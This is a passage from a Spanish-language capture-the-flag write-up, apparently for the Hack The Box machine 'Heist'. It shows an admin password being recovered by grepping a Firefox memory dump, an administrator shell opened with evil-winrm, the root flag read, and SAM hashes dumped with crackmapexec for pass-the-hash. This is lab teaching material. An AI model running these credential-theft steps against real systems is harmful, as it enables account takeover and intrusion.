[03:54:16] Dump 1 initiated: C:\Users\Chase\Desktop\firefox.exe_240414_035416.dmp
[03:54:16] Dump 1 writing: Estimated dump file size is 493 MB.
[03:54:18] Dump 1 complete: 493 MB written in 2.5 seconds
[03:54:19] Dump count reached.
```

- Como el archivo pesa mucho lo que podemos hacer es que mientras se descarga podemos aplicar los `strings` y filtrar por `password` para ver si encontramos algo.

```bash
*Evil-WinRM* PS C:\Users\Chase\Desktop> download C:\Users\Chase\Desktop\
Info: Downloading C:\Users\Chase\Desktop\firefox.exe_240414_035416.dmp to firefox.exe_240414_035416.dmp
```

- Y vemos esto esas credenciales funcionan para logearnos en la pagina web como el Administrator.

```bash
➜  content strings firefox.exe_240414_035416.dmp | grep password
passwordsCountHistogram
passwordmgr-crypto-login
passwordField
passwordElement
goog-passwordwhite-protox0E!
"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

<p align="center">
<img src="/assets/images/htb-writeup-heist/9.png">
</p>

- Vemos también que el usuario esta dentro del grupo `Remote Management Users`.

```bash
➜  content crackmapexec winrm 10.129.116.26 -u 'Administrator' -p '4dD!5}x/re8]FBuZ'
SMB         10.129.116.26   5985   SUPPORTDESK      [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk)
HTTP        10.129.116.26   5985   SUPPORTDESK      [*] http://10.129.116.26:5985/wsman
WINRM       10.129.116.26   5985   SUPPORTDESK      [+] SupportDesk\Administrator:4dD!5}x/re8]FBuZ (Pwn3d!)
```

## Shell as administrator

- Ahora ya podemos ver la ultima flag.

```bash
➜  content evil-winrm -i 10.129.116.26 -u 'Administrator' -p '4dD!5}x/re8]FBuZ'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
5c7ac5f3da79f3018d63e5639785415f
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## Dumping SAM hashes

- Aquí tenemos los hashes de algunos **usuarios** para hacer `pass the hash`.

```bash
➜  content crackmapexec smb 10.129.116.26 -u 'Administrator' -p '4dD!5}x/re8]FBuZ' --sam
SMB         10.129.116.26   445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.129.116.26   445    SUPPORTDESK      [+] SupportDesk\Administrator:4dD!5}x/re8]FBuZ (Pwn3d!)
SMB         10.129.116.26   445    SUPPORTDESK      [+] Dumping SAM hashes
SMB         10.129.116.26   445    SUPPORTDESK      Administrator:500:aad3b435b51404eeaad3b435b51404ee:10f08e9e3787aec843594cfd01f1a6a5:::
SMB         10.129.116.26   445    SUPPORTDESK      Guest:501:aad3b435b51404eeaad3b435b51404ee:d5dd356a1d8a41ceafcd92f3e1795a71:::
SMB         10.129.116.26   445    SUPPORTDESK      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.116.26   445    SUPPORTDESK      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:83f0f384401e2cb89df6f920af3254c7:::
SMB         10.129.116.26   445    SUPPORTDESK      Hazard:1008:aad3b435b51404eeaad3b435b51404ee:551f5fc818a8c5b65d19be1c977f5326:::
SMB         10.129.116.26   445    SUPPORTDESK      support:1009:aad3b435b51404eeaad3b435b51404ee:04456c45a7adb052b6a315cb64992516:::
SMB         10.129.116.26   445    SUPPORTDESK      Chase:1012:aad3b435b51404eeaad3b435b51404ee:bb2e1bf236b6219cb45811d5f2d55068:::
SMB         10.129.116.26   445    SUPPORTDESK      Jason:1013:aad3b435b51404eeaad3b435b51404ee:10608c8436315acb9c703aa7b2e04750:::
SMB         10.129.116.26   445    SUPPORTDESK      [+] Added 8 SAM hashes to the database
```
